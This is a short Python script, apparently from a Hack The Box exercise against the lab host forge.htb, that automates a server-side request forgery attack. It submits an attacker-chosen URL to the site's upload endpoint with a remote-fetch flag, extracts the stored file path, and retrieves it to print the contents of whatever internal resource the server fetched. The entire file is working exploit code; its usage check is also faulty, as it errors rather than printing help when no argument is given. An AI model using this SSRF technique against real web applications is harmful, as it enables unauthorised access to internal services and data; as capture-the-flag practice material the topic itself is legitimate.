import requests as req
from sys import argv

url = "http://forge.htb/"

if not argv[1]:
    print(f"Usage: python {argv[0]} <payload>")

else:
    # Run SSRF
    payload = {
        "url": argv[1],
        "remote": 1
    }

    r = req.post(f"{url}/upload", data = payload)
    up_file = r.text.split("http://forge.htb/uploads/")[1][:-2]

    # Get results
    r = req.get(f"{url}/uploads/{up_file}", data = payload)
    print(r.text)
    